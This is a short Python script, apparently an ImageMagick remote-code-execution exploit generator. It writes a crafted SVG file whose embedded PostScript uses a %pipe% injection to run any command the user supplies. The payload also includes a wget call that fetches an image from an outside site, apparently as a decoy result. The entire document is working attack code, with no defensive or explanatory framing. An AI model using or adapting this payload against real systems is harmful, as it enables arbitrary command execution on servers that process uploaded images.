#! /usr/bin/python3

import sys

def genareate_payload(cmd,filename):
	payload = f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/tmp/ 2> /dev/null;wget -O done.jpg https://thispersondoesnotexist.com/image 2> /dev/null; {cmd} ) (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/3" /> <svg width="1px" height="1px" /> </hui>"""
	f = open(filename,"w").write(payload)
	return True

def main():
	if(len(sys.argv)) < 3:
		print("Usage: python imagemagick-rce.py <CMD> <MalFilename>")
		exit()
	genareate_payload(sys.argv[1],sys.argv[2])

if __name__ == "__main__":
	main()

